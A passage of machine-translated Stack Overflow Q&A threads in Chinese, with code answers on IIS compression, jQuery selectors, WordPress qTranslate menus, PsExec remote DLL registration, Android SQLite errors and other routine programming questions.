> appcmd set config /section:staticContent /+[fileExtension='.json',mimeType='application/json']
> 
> appcmd.exe 设置配置 -section:system.webServer/httpCompression /+"dynamicTypes.[mimeType='application/json',enabled='True']" /commit:apphost

确保重新启动 IIS Express。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2021-05-06T14:46:41.293

对于 Visual Studio 2019，我发现上述方法不起作用，因为该`applicationhost.config`文件是项目独有的。该文件存储在`.vs\<solution_name>\config\applicationhost.config`. 对于 VS 2017，它不在解决方案子文件夹中。

因此，我的解决方案是替换`<httpCompression/>`为以下内容。

```
<httpCompression directory="%TEMP%\iisexpress\IIS Temporary Compressed Files">
            <scheme name="gzip" dll="%IIS_BIN%\gzip.dll" />
            <dynamicTypes>
                <add mimeType="text/*" enabled="true" />
                <add mimeType="message/*" enabled="true" />
                <add mimeType="application/x-javascript" enabled="true" />
                <add mimeType="application/javascript" enabled="true" />
                <add mimeType="application/json" enabled="true" />
                <add mimeType="*/*" enabled="false" />
            </dynamicTypes>
            <staticTypes>
                <add mimeType="text/*" enabled="true" />
                <add mimeType="message/*" enabled="true" />
                <add mimeType="application/javascript" enabled="true" />
                <add mimeType="application/atom+xml" enabled="true" />
                <add mimeType="application/xaml+xml" enabled="true" />
                <add mimeType="image/svg+xml" enabled="true" />
                <add mimeType="*/*" enabled="false" />
            </staticTypes>
        </httpCompression> 
```

# jquery - 如何仅遍历限定元素，而不是全部

> ID：10102748
> 
> 赞同：0
> 
> 时间：2012-04-11T08:51:54.460
> 
> 标签：jquery

如果我在页面中有带有如下 ID 的复选框

```
a_chk1, a_chk2, a_chk3, b_chk1, b_chk2, b_chk3, c_chk1, c_chk2 
```

如果我想检索 ID 以“a_”开头的复选框。下面的代码完成了我的工作

```
$(':checkbox').filter(function(){return $(this).prop('id').indexOf("a_") > -1;}) 
```

但它会遍历每个复选框并过滤所需的元素。但是`is there any possibility of iterating through only qualified elements`。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:55:17.117

您可以让 jQuery 在选择器中为您完成所有工作，如下所示：

```
$(':checkbox[id^="a_"]') 
```

在这里工作演示：http: [//jsfiddle.net/jfriend00/5qENn/](http://jsfiddle.net/jfriend00/5qENn/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:53:42.103

不，除非你也给他们上课（例如`class="a"`前三个等）。如果你这样做，那么你可以使用`$(".a:checkbox")`或类似的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:55:33.557

是的，你可以这样做：

```
$(':checkbox[id^="a_"]').each(function() {

}); 
```

使用[以选择器开头的属性](http://api.jquery.com/attribute-starts-with-selector/)并使用[.each()进行迭代](http://api.jquery.com/each/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T08:56:02.963

我想这在引擎盖下也会迭代，但它更干净。

```
$('input:checkbox[id^="a_"]') 
```

# php - 如何在 SQL 或 PHP 中将小数（16,4）转换为 DATE 或 DATETIME

> ID：10102749
> 
> 赞同：2
> 
> 时间：2012-04-11T08:51:55.180
> 
> 标签：php, sql, date, decimal

我的数据库字段有一个小问题......提交时间是十进制（16,4）类型，我需要将其转换为日期或日期时间......但我不明白......

一个例子：

```
decimal (16,4)         datetime
1334041225.5900        2012-04-10 09:00:25 +02:00 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:58:20.243

这*似乎*是一个带有几分之一秒的 unix 时间戳，在这种情况下......

```
print date('r', 1334041225.5900); 
```

（这个编号系统可能在 2012-04-10 09:00:25 +02:00 与 Unix 时间戳相交）。

有关详细信息，请参阅[日期功能](http://php.net/manual/en/function.date.php)的手册页。

在 SQL 中进行转换可能是可能的，但您没有说明这是什么类型的 DBMS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:09:20.477

在插入小数之前，您必须使用此语句将这些十进制值转换为日期格式， echo strtotime(date('Ymd H:i:s',1334041225.5900));

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T09:11:29.223

在 SQL 'select dateadd(ss, 1334041225.5900, '19700101')'

# iphone - 信息属性列表所需的设备能力

> ID：10102750
> 
> 赞同：1
> 
> 时间：2012-04-11T08:51:58.360
> 
> 标签：iphone, ios

我试图了解此列表：`UIRequiredDeviceCapabilities`和单个键之间的区别，例如：`UIRequiresPersistentWiFi`。AppStore 的列表是否用于过滤允许哪些设备下载应用程序，但各个密钥用于我的应用程序中的“配置”目的？

[http://developer.apple.com/library/ios/#documentation/general/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW12](http://developer.apple.com/library/ios/#documentation/general/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW12)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:28:37.833

是的，完全正确。比如wifi是一个设置，可以由用户开启和关闭，但是这个能力存在于所有设备上，所以显然不能用来过滤设备，对吧？:)。其他不是要求，而是应用程序行为的设置。

总结一下： UIRequiredDeviceCapabilities 中的东西在任何给定的设备上要么存在要么不存在（例如，armv7 架构）。如果您将一个添加到列表中，则不允许安装没有它的设备。

其他是定义应用程序如何工作和外观的设置（状态栏样式、抗锯齿等），但它将安装在任何能够运行 iOS 的设备上。

# wordpress - 如何在 wordpress 上使用 qtranslate 翻译导航菜单的链接？

> ID：10102752
> 
> 赞同：4
> 
> 时间：2012-04-11T08:52:00.860
> 
> 标签：wordpress, navigation, qtranslate

我有一个双语（英语/阿拉伯语）wordpress 网站。我能够成功翻译导航菜单项。但是，阿拉伯网站上的菜单链接，链接到默认语言，即英语。

我如何告诉 wordpress 我需要在阿拉伯语站点上更改菜单链接（我需要阿拉伯语站点上的链接包含 /ar，例如：www.talalonline.com/ar 而不是 www.talalonline.com）

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-30T08:42:59.833

@maha，我对此进行了很多搜索，并在[这里](http://www.qianqin.de/qtranslate/forum/viewtopic.php?f=3&t=3604)找到了解决方案，但是答案有点模糊……</p>

由于您不想弄乱您的 WP 核心文件，因此所有更改都在主题中。您的主题位于**wp-content/themes/ *your-theme-name/***

找到您的主题的**function.php**并将上面的代码添加到文件末尾的 php 结束标记 ( **?>** ) 之前：

```
class CustomLinkModifierWalker extends Walker_Nav_Menu {
    function __( $text ) {
        if ( preg_match_all('~(.*?)\|(\w{2,})\|~', $text, $matches) ) {
            $text = '';
            foreach ($matches[1] as $i => $match) {
                $text .= "[:{$matches[2][$i]}]$match";
            }
            $text = __( $text );
        }
        return $text;
    }
    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
        global $wp_query;
        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

        $class_names = $value = '';

        $classes = empty( $item->classes ) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;

        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
        $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

        $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
        $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

        $output .= $indent . '<li' . $id . $value . $class_names .'>';

        $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
        $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
        $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
        $attributes .= ! empty( $item->url )    ? ' href="' . esc_attr( $this->__( $item->url )  ) .'"' : '';

        $item_output = $args->before;
        $item_output .= '<a'. $attributes .'>';
        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
        $item_output .= '</a>';
        $item_output .= $args->after;

        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
} 
```

然后，您必须在主题中找到菜单视图的位置。我使用的主题在**header.php**中实现。也许你的使用另一个文件名，比如**header-fancy-theme.php**。

我的标题视图代码是这样的：

```
<?php
$nav_sec_menu_params = array(
    'depth' => 0,
    'theme_location' => 'sec-menu',
    'container_class' => 'menu-topmenu-container',
    'menu_class' => 'menus menu-topmenu',
    'fallback_cb' => 'block_sec_menu'
);
wp_nav_menu($nav_sec_menu_params);
?> 
```

您所要做的就是在 param 数组中添加 Walker 实现：

```
<?php
$nav_sec_menu_params = array(
    'walker' => new CustomLinkModifierWalker(),
    'depth' => 0,
    'theme_location' => 'sec-menu',
    'container_class' => 'menu-topmenu-container',
    'menu_class' => 'menus menu-topmenu',
    'fallback_cb' => 'block_sec_menu'
);
wp_nav_menu($nav_sec_menu_params);
?> 
```

然后，在您的菜单中，您将使用**|lang|** 在语言 URL 之后，如下所示：

![在此处输入图像描述](../Images/95ffa85955a52446a83d929894d13a1a.png)

我知道这不是您跳过自动语言链接的确切用途，但这可能会解决您的问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-23T12:18:32.247

```
 //tested and worked for me.
//use native wordpress filter wp_setup_nav_menu_item

 function qtrans_menuitem( $menu_item ) {

// convert local URLs in custom menu items
   if ($menu_item->type == 'custom' && stripos($menu_item->url, get_site_url()) !== false){
    $menu_item->url = qtrans_convertURL($menu_item->url);
}     
return $menu_item;
 }

 add_filter('wp_setup_nav_menu_item', 'qtrans_menuitem', 0); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-06T23:32:39.557

qtranslate 的 fork 开箱即用：

[https://wordpress.org/plugins/qtranslate-x/](https://wordpress.org/plugins/qtranslate-x/)

在“导航标签”字段的菜单项中，只需提供两种语言的字符串：

```
[:en]English Text[:de]Deutsch Text 
```

使用 qTranslate-X 2.7.8、Wordpress 4.1 和二十五 1.0 主题进行测试

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T11:59:09.330

WP 中有四个功能可以使用默认或插件选项翻译菜单文本。

这四个函数中的每一个都需要至少一个参数，即要翻译的文本。功能是：

1.  __() –（两个下划线）大部分时间都会用到的基本函数。它以正确的语言返回文本。

2.  *e() – 与 _* () 相同，只是它回显文本而不是返回文本。

3.  _n() – 当文本可能是复数时使用，例如，如果您要显示已发表的评论数，您可能希望根据评论数输出“X 评论”或“X 评论”你有。

4.  _x() – 当单词的翻译取决于上下文时很有用。根据上下文，“发布”可能意味着“发布（名词）”或“发布（动词）”。译者在翻译准确时知道您的意思很重要。_x() 主要用于使用单个单词的地方。

前任

```
echo __( 'Menu Text' ); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T18:02:42.197

我还在使用 qTranslate 和双语阿拉伯语/英语网站。

您可以拥有`.htaccess`以下内容：

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
#RewriteRule ^ar[\/]?$ index.php?lang=ar
#RewriteRule ^en[\/]?$ index.php?lang=en 
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule> 
```

**并从 qTranslate 插件设置页面的高级设置**部分选择“使用预路径模式（默认，将 /en/ 放在 URL 前面）”选项。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-08-05T11:15:20.530

我已经通过在西班牙语和英语和法语上添加 2 个菜单项来解决它。然后，我将每种语言中的“导航标签”留空。当没有导航标签时，wordpress 不会“绘制”菜单项，因此当我的网站以西班牙语显示时，“英文链接项”不会出现，而当我有英文网站时，它与西班牙语菜单的情况相同物品。

[![在此处输入图像描述](../Images/e3c69552bc568409a3f9a40ff5bd0e40.png)](https://i.stack.imgur.com/ghhCh.png)

# c# - 为什么这段代码不能在基于 x64 的 Windows 机器上远程运行

> ID：10102755
> 
> 赞同：1
> 
> 时间：2012-04-11T08:52:04.600
> 
> 标签：c#, powershell, remote-debugging

我有一段 C# 代码，用于在 C# 中远程注册 *.tlb 文件。我正在使用 PsExec (Powershell) 使用以下命令部署它：

```
.\PsExec.exe \\* -u "username" -p "password" -h -c "MyExe.exe" 
```

它在 x86 机器上运行良好，但在 x64 机器上失败并出现以下错误：`-2146232576`.

如果我在 64 位机器上本地运行 *.exe，它工作正常。代码如下：

```
static void Main(string[] args)
{
    try
    {
        Directory.CreateDirectory(@"C:\Directory");
    }
    catch(Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
    finally
    {
        try
        {
            File.Copy(@"\\x.x.x.x\MyDll.dll", @"C:\Directory\MyDll.dll");
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        finally
        {
            try
            {
                var p = new Process
                            {
                                StartInfo =
                                    {
                                        FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
                                        Arguments = @"C:\Directory\MyDll.dll",
                                        UseShellExecute = false
                                    }
                            };

                var q = new Process
                            {
                                StartInfo =
                                    {
                                        FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
                                        Arguments = @"C:\Directory\MyDll.dll /tlb",
                                        UseShellExecute = false
                                    }
                            };

                var r = new Process
                            {
                                StartInfo =
                                    {
                                        FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
                                        Arguments = @"C:\Directory\MyDll.dll /codebase",
                                        UseShellExecute = false
                                    }
                            };

                p.Start();
                q.Start();
                r.Start();
            }
            catch(Exception z)
            {
                Console.WriteLine(z.Message);
            }
        }

        Console.WriteLine("Done and Done");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T10:50:44.567

您得到的错误是 1792 = ERROR_NETLOGON_NOT_STARTED = "尝试登录，但未启动网络登录服务。"

Mark Russinovich 的这篇[文章](http://www.windowsitpro.com/article/remote-computing/psexec)讨论了 PsExec 的安全方面。

尝试使用 -i 选项运行它。

# java - XML Parser 通过比较其值来获取特定的属性

> ID：10102758
> 
> 赞同：-2
> 
> 时间：2012-04-11T08:52:12.950
> 
> 标签：java, xml, parsing

我有如下所示的 XML 文件内容。

```
<FileIndex>
<Document SEQUENCE="0" FILENAME="A.xml"  />
<Document SEQUENCE="1" FILENAME="B.htm"  />
<Document SEQUENCE="2" FILENAME="C.htm"  />
<Document SEQUENCE="3" FILENAME="D.htm"  /> 
```

我想获取属性 FILENAME 的值，其中属性 SEQUENCE 的值等于“1”。哪种方式是首选方式？SAX、DOM、XPath？以及如何实施？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:04:13.927

这是您需要的：

```
 @Test
  public void test() throws Exception
  {
    String xml =
        "<FileIndex>\n" + 
        "<Document SEQUENCE=\"0\" FILENAME=\"A.xml\"  />\n" + 
        "<Document SEQUENCE=\"1\" FILENAME=\"B.htm\"  />\n" + 
        "<Document SEQUENCE=\"2\" FILENAME=\"C.htm\"  />\n" + 
        "<Document SEQUENCE=\"3\" FILENAME=\"D.htm\"  />\n" + 
        "</FileIndex>";
    XPath xp = XPathFactory.newInstance().newXPath();
    System.out.println(xp.evaluate("/FileIndex/Document[@SEQUENCE='1']/@FILENAME", new InputSource(new StringReader(xml)), XPathConstants.STRING));
  } 
```

对于这么小的 XML，最好使用 XPath

# asp.net-mvc-3 - 仅查看一次的 mvc 实现页面

> ID：10102760
> 
> 赞同：2
> 
> 时间：2012-04-11T08:52:25.707
> 
> 标签：asp.net-mvc-3

我想为我的网站实现一个条款和条件页面，要求用户接受条款和条件，并可能将该值存储在 cookie 中，这样我就可以判断他们是否已接受而不是不断提示他们，并非所有用户都有帐户所以我认为饼干是去那里的方式。

只是想最好的方法来实现这一点，如果用户没有，最好使用全局过滤器在站点上的任何操作之前执行并重定向到条款和条件页面（将请求的页面保存在某处）登录，或者有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:22:36.227

在将处理 T&C POST 的操作方法中：

```
Session["AcceptedTC"] = true;

[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, Inherited = true, AllowMultiple = false)]
public class AcceptedTermsCheck : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        // Check if AcceptedTC is set to true

        // If set, then do nothing

        // Otherwise redirect to TC page
    }
} 
```

使用属性的原因是您可能有一些页面不需要用户接受条款和条件。如果您要对 Application_BeginRequest 进行检查，那么您将没有这种灵活性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:29:54.523

另一种选择是覆盖 global.asax 文件上的 Application_BeginRequest 方法。

```
protected void Application_BeginRequest(object sender, EventArgs e)
{
   if(ShouldIShowMessage())
   {
       this.Response.Redirect("RedirectUrl");
   }
}

private bool ShouldIShowMessage()
{
   // Decision logic here
} 
```

**编辑** 我只是想，要澄清你的决策逻辑仍然需要说一个 cookie 之类的东西，但它不必用属性装饰控制器或添加全局过滤器。

# apache-flex - 读取通过 Flex 中的 FileReference 打开的文件

> ID：10102762
> 
> 赞同：0
> 
> 时间：2012-04-11T08:52:42.577
> 
> 标签：apache-flex, actionscript, air

我必须在 AIR 中浏览并打开一个文件。我可以通过 File 类访问文件：

```
var file:File = File.applicationStorageDirectory.resolvePath("somefile.txt");
var stream:FileStream = new FileStream();
stream.open(file, FileMode.READ); 
```

我可以通过 FileReference 类浏览文件：

```
var fileRef:FileReference = new FileReference();
fileRef.browse(allTypes); 
```

但我似乎无法将文件从 FileReference 对象获取到 File 对象中。

打开 FileReference 后调试它时没有暴露“路径”成员，有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:13:10.417

您必须使用[File#browseForOpen()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/filesystem/File.html#browseForOpen%28%29)而不是`FileReference#browse()`，如下所示：

```
private var f:File;

public function browseForRead():void {
    f = File.documentsDirectory;
    f.addEventListener(Event.SELECT, readFile); 
    f.browseForOpen("Open file");
}

private function readFile(event:Event):void {
    var stream:FileStream = new FileStream();
    stream.open(f, FileMode.READ);
    trace(stream.readUTFBytes(stream.bytesAvailable));
} 
```

`FileReference#browse()`用于在 Web 应用程序中上传文件。

# css - IE8 CSS浮动不会在屏幕边缘换行，而是保持在同一行

> ID：10102763
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:52:45.443
> 
> 标签：css, internet-explorer-8, css-float

**编辑：我很困惑请关闭这个问题**

我希望浮动的 div 在它们到达屏幕边缘时会自动换行，并且它们在所有浏览器中都会发生，除了 IE8。仅在 IE8 中，div 无限向右延伸，并创建一个水平滚动条。

这是我的代码：

```
<div style="float:left;height:290px;width:250px;">
(some text)
</div>

<div style="float:left;height:290px;width:250px;">
(some text)
</div>

<div style="float:left;height:290px;width:250px;">
(some text)
</div>

...etc 
```

有没有快速解决这个问题的方法？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-11T09:18:10.700

也许在它周围包裹一个div？您创建的这些 div 周围的东西很重要。

导致在 IE8 中以 jsfiddle 呈现它不会显示问题：

[http://jsfiddle.net/sYskU/](http://jsfiddle.net/sYskU/)

# android - 首次将 .apk 文件上传到市场后出现“SQLiteException：无法打开数据库文件”（Android 2.3.5）

> ID：10102764
> 
> 赞同：1
> 
> 时间：2012-04-11T08:52:45.660
> 
> 标签：android, sqlite

**编辑：该应用程序在Android 版本 2.3.5**的手机上崩溃

 **我昨天在 Google Play 上上传了我的第一个应用程序，今天我收到以下错误报告：

```
android.database.sqlite.SQLiteException: unable to open database file
at android.database.sqlite.SQLiteDatabase.dbopen(Native Method)
at android.database.sqlite.SQLiteDatabase.<init>(SQLiteDatabase.java:1956)
at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:918)
at com.hazcheck.dgl.data.ExternalDBOpenHelper.openDataBase(ExternalDBOpenHelper.java:96)
at com.hazcheck.dgl.SearchActivity.afterTextChanged(SearchActivity.java:284)
at android.widget.TextView.sendAfterTextChanged(TextView.java:6566)
at android.widget.TextView$ChangeWatcher.afterTextChanged(TextView.java:6989)
at android.text.SpannableStringBuilder.sendTextHasChanged(SpannableStringBuilder.java:897)
at android.text.SpannableStringBuilder.change(SpannableStringBuilder.java:353)
at android.text.SpannableStringBuilder.change(SpannableStringBuilder.java:269)
at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:432)
at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:409)
at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:28)
at android.view.inputmethod.BaseInputConnection.replaceText(BaseInputConnection.java:679)
at android.view.inputmethod.BaseInputConnection.commitText(BaseInputConnection.java:185)
at com.android.internal.widget.EditableInputConnection.commitText(EditableInputConnection.java:120)
at com.android.internal.view.IInputConnectionWrapper.executeMessage(IInputConnectionWrapper.java:332)
at com.android.internal.view.IInputConnectionWrapper$MyHandler.handleMessage(IInputConnectionWrapper.java:86)
at android.os.Handler.dispatchMessage(Handler.java:99)
at android.os.Looper.loop(Looper.java:143)
at android.app.ActivityThread.main(ActivityThread.java:4268)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:507)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
at dalvik.system.NativeStart.main(Native Method) 
```

编辑：这是我的 SQLiteOpenHelper 类，我可能做错了什么，请检查一下：

```
package com.hazcheck.dgl.data;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
//import java.util.zip.ZipInputStream;

import com.hazcheck.dgl.R;

import android.content.Context;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
//import android.content.res.Resources;

public class ExternalDBOpenHelper  extends SQLiteOpenHelper{

    //public static int DB_PATH_ID; 
    public static String DB_NAME;
    public static String DB_PATH;
    public static int DB_VERSION;
    public SQLiteDatabase database;
    public final Context context;

    //private Resources resources;

    public SQLiteDatabase getDb() {
        return database;
    }
        public ExternalDBOpenHelper(Context context) {
        super(context, DB_NAME = context.getString(R.string.app_data_name), null, DB_VERSION = Integer.parseInt((context.getString(R.string.app_database_version))));
        this.context = context;
        String packageName = context.getPackageName();
        //resources = context.getResources();
        //DB_PATH_ID = R.raw.imdg35;
        DB_PATH = String.format("//data//data//%s//databases//", packageName);

        openDataBase(); //createDataBase();
    }

    public void createDataBase() {
        boolean dbExist = checkDataBase();
        if (!dbExist) {
            this.getReadableDatabase();
            try {
                copyDataBase();
            } catch (IOException e) {
                Log.e(this.getClass().toString(), "Copying error");
                throw new Error("Error copying database!");
            }
        } else {
            Log.i(this.getClass().toString(), "Database already exists");
        }
    }

    private boolean checkDataBase() {
        String path = DB_PATH + DB_NAME;
        File dbFile = new File(path);
        return dbFile.exists();
    }

    private void copyDataBase() throws IOException {
        InputStream externalDbStream = context.getAssets().open(DB_NAME);

        String outFileName = DB_PATH + DB_NAME;

        OutputStream localDbStream = new FileOutputStream(outFileName);

    byte[] buffer = new byte[1024];
    int bytesRead;
    while ((bytesRead = externalDbStream.read(buffer)) > 0) {
        localDbStream.write(buffer, 0, bytesRead);
    }

    localDbStream.close();
    externalDbStream.close();
/*  String outFileName = DB_PATH + DB_NAME;
    InputStream is = resources.openRawResource(DB_PATH_ID);
    OutputStream myOutput = new FileOutputStream(outFileName);
    ZipInputStream zis = new ZipInputStream(new BufferedInputStream(is));
    try {
        while (zis.getNextEntry() != null) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int count;
            while ((count = zis.read(buffer)) != -1) {
                baos.write(buffer, 0, count);
                //Log.d("", buffer.toString());
            }
            baos.writeTo(myOutput);
        }
    }
    finally{
        zis.close();
        myOutput.flush();
        myOutput.close();
        is.close();
    }*/
}

public SQLiteDatabase openDataBase() throws SQLException {
    String path = DB_PATH + DB_NAME;
    if (database == null) {
        createDataBase();
        database = SQLiteDatabase.openDatabase(path, null,  SQLiteDatabase.OPEN_READWRITE);
    }
    return database;
}
@Override
public synchronized void close() {
    if (database != null) {
        database.close();
    }
    super.close();
}
@Override
public void onCreate(SQLiteDatabase db) {}
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:08:30.420

1）您在这一行指的是哪个数据库：`com.hazcheck.dgl.SearchActivity.afterTextChanged(SearchActivity.java:284)`？相应的数据库是否存在？您是否在 OnCreate() 方法中实例化/创建了数据库？如果没有，那就是你的错误。您可能在您的设备上测试了该应用程序，而您只是第一次创建它；即使您替换了应用程序包，应用程序也会在其中重新使用数据库。

2）关于*“1个错误报告，而0个安装”，*这也发生在我的应用程序中。更新安装数量的过程可能是周期性的，而更新错误日志是即时的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:20:47.913

```
 > String outFileName = DB_PATH + DB_NAME; 
```

这可能是一个问题，具体取决于应用程序是安装在 SD 卡上还是手机内存中。

类`DatabaseContext`及其后代（如`Activity`）有一个方法

```
 File getDatabasePath(String name) 
```

那应该给你正确的目录。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-10T09:08:45.027

我发现问题出在数据库本身，它是用旧的 Sqlite 版本创建的。现在，我使用 Sqlite 3.7.11 并重新创建了数据库，现在它工作得很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T03:30:06.293

在我的情况下，当我使用该方法使用 databaseInstance 打开数据库时

```
private static boolean openDB(String dbPathWithName) {
        boolean status = true;
        try {
            if (databaseInstance == null || !databaseInstance.isOpen()){
                databaseInstance = SQLiteDatabase.openDatabase(dbPathWithName, null, SQLiteDatabase.OPEN_READWRITE + SQLiteDatabase.CREATE_IF_NECESSARY);

            }
        } catch (Exception ex){
            status = false;
            NGAndroidUtil.logErr("DataHelper", ex.getMessage(), ex);
        }
        return status;
    } 
```

在此它抛出异常“无法打开数据库”......在这个我没有以正确的格式给出数据库的路径，这就是它抛出异常“无法打开数据库......确保路径您要打开的正确格式的数据库..**

# iphone - Reading the PDF file from server in my IPhone application?

> ID：10102771
> 
> 赞同：-2
> 
> 时间：2012-04-11T08:52:57.550
> 
> 标签：iphone

I have an IPhone application in which i am trying to view the pdf file in the server to my application without downloading it.Can any body help me with meaningfull links or procedures?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:01:39.877

我可能误解了，但是：
它不能完成。对于要运行的任何东西，它都需要通过您的 cpu，这意味着将其下载到内存/硬盘/iphone 存储中。每当您在计算机上“查看”PDF 时，它就会被下载，并在您完成后丢弃。

既然我很可能搞错了，那么“不下载”是什么意思？

# mongodb - 合并 RDBMS 和 NoSQL 数据库

> ID：10102779
> 
> 赞同：4
> 
> 时间：2012-04-11T08:53:43.653
> 
> 标签：mongodb, relational-database, nosql

好的，假设我有一个包含 100 多个表的大型 MySql 数据库。虽然它运行得很好，但我有两个表，每个表每年可以超过 1 亿个条目。在这两个表上，我必须执行搜索和计算，而不仅仅是存档信息。

我正在考虑将这些表的逻辑转移到 NoSQL 数据库，因为它具有良好的可扩展性。（MongoDB，CouchDB）

由于存储在这些表中的信息通过应用程序在许多查询中使用，我在想是否有一种方法可以在两个数据库之间创建合并。

虽然能够编写一个自动从nosql db中提取数据的sql查询太漂亮了，但也许还有另一种方法；就像在 MySQL 中使用存储的 plsql 过程来调用 NoSQL 数据库上的查询一样。或者从 plsql 调用系统命令并获取结果。

只是想提一下，我以 MySQL 为例，它可以是任何东西，Oracle，Postgres。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-01T16:27:52.550

所以做这样的事情的流行语是多语言**持久性**（也许这有助于进一步的研究）。大多数情况下，您必须自己集成这些不同的数据存储。我知道有两种解决方案，但我还没有测试过它们。

第一个是使用 EclipseLink 作为两个数据存储之上的抽象。我为此找到的第一个链接：[http ://blog.eisele.net/2012/11/polyglot-persistence-eclipselink-with.html](http://blog.eisele.net/2012/11/polyglot-persistence-eclipselink-with.html)

第二个是使用 PostgreSQL 和外部数据包装器在 Postgres 中嵌套一个 nosql 数据库：[http ://wiki.postgresql.org/wiki/Foreign_data_wrappers](http://wiki.postgresql.org/wiki/Foreign_data_wrappers)

# css - Facebook粉丝，风格外观 - 不工作

> ID：10102781
> 
> 赞同：0
> 
> 时间：2012-04-11T08:53:46.273
> 
> 标签：css, facebook, api, styles, facebook-page

我的网站上有一个 Faceboon Fan api，我想自己设计它，但我似乎没有工作。我确实将`CSS`ftp 上的 css 文件设置为，但这就像风扇盒完成使用它一样。

任何人都知道问题是什么？

**风扇盒：**

```
<script type="text/javascript" src="http://static.ak.connect.facebook.com/js/api_lib/v0.4/FeatureLoader.js.php/en_US"></script>
<script type="text/javascript">FB.init("");</script>
<fb:fan profile_id="145883417064" stream="0" connections="14" width="500px" height="600px" header="0" logobar="0" css="css=MY_URL/Facebook_CSS/fb_css.css">
</fb:fan> 
```

**CSS：**

```
...
.fan_box .full_widget .connect_top {
    background:green !important; <--Green for testing
    padding:0 0 10px 0 !important;
}
... 
```

**当我刷新页面时，这就是我得到的 css：**

```
.fan_box .full_widget .connect_top {
    background: none repeat scroll 0 0 #ECEFF5;
} 
```

**它来自这个css文件：** `ZZOSKCuiTWq.css (linje 7)`我不知道它来自哪里？？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:05:56.347

